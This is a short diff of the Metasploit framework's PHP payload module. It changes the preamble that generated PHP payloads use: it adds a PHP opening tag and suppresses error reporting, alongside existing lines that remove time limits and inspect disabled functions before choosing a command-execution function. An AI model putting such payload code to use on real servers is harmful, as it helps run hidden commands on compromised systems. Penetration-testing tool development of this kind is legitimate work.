@@ -25,7 +25,8 @@ module Msf::Payload::Php
 
     # Canonicalize the list of disabled functions to facilitate choosing a
     # system-like function later.
-    preamble = "
+    preamble = "/*<?php /**/
+      @error_reporting(0);
       @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
       #{dis}=@ini_get('disable_functions');
       if(!empty(#{dis})){
